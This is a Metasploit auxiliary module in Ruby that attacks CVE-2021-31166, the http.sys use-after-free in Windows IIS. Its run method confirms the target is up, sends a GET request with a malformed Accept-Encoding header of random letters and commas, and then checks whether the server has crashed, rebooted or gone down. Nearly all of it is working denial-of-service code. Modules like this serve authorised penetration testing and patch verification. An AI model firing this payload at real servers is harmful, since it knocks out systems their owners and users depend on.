##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows IIS HTTP Protocol Stack DOS',
        'Description' => %q{
          This module exploits CVE-2021-31166, a UAF bug in http.sys
          when parsing specially crafted Accept-Encoding headers
          that was patched by Microsoft in May 2021, on vulnerable
          IIS servers. Successful exploitation will result in
          the target computer BSOD'ing before subsequently rebooting.
          Note that the target IIS server may or may not come back up,
          this depends on the target's settings as to whether IIS
          is configured to start on reboot.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Max',                                             # Aka @_mxms. Vulnerability discovery
          'Stefan Blair',                                    # Aka @fzzyhd1. Vulnerability discovery
          'Axel Souchet',                                    # Aka @0vercl0k. PoC exploit
          'Maurice LAMBERT <mauricelambert434[at]gmail.com>' # msf module
        ],
        'Platform' => 'win',
        'References' => [
          ['CVE', '2021-31166'],
          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2021-31166'],
          ['URL', 'https://github.com/mauricelambert/CVE-2021-31166'],
          ['URL', 'https://twitter.com/metr0/status/1392631376592076805'],
          ['URL', 'https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-31166']
        ],
        'DisclosureDate' => '2021-05-11',
        'Notes' => {
          'Stability' => [CRASH_OS_RESTARTS],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS, SCREEN_EFFECTS]
        }
      )
    )

    register_options(
      [
        OptString.new(
          'TARGETURI', [true, 'The URI of the IIS Server.', '/']
        )
      ]
    )
  end

  # This module performs a DOS attack using a simple HTTP request.
  def run
    print_status('Connecting to target to make sure its alive...')

    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, ''),
      'method' => 'GET'
    )

    if res.nil?
      fail_with(Failure::Unreachable, "#{peer} - Could not connect to the target IIS server - no response")
    end

    print_good('Successfully connected to target. Sending payload...')

    payload =
      "#{Rex::Text.rand_text_alpha(5)}, #{Rex::Text.rand_text_alpha(3)}, ,"

    exploit_headers = {
      'Accept-Encoding' => payload
    }

    begin
      send_request_cgi({
        'uri' => normalize_uri(target_uri.path, ''),
        'timeout' => 1, # short timeout -> the server should not respond
        'method' => 'GET',
        'headers' => exploit_headers
      })
    rescue Rex::ConnectionError, Errno::ECONNRESET
      print_good('Connection reset by target server or connection failed when sending the malicious payload!')
    ensure
      print_good('Payload was sent to the target server.')
      print_status('Checking that the server is down...')
    end

    begin
      res = send_request_cgi(
        'uri' => normalize_uri(target_uri.path, ''),
        'method' => 'GET'
      )

      if res.nil?
        print_good('Target is down.')
      else
        print_error('Target appears to still be alive. It may have not received the packet due to network filtering, or it may not be vulnerable.')
      end
    rescue Rex::ConnectionError, Errno::ECONNRESET
      print_good('Target is down.')
    end
  end
end
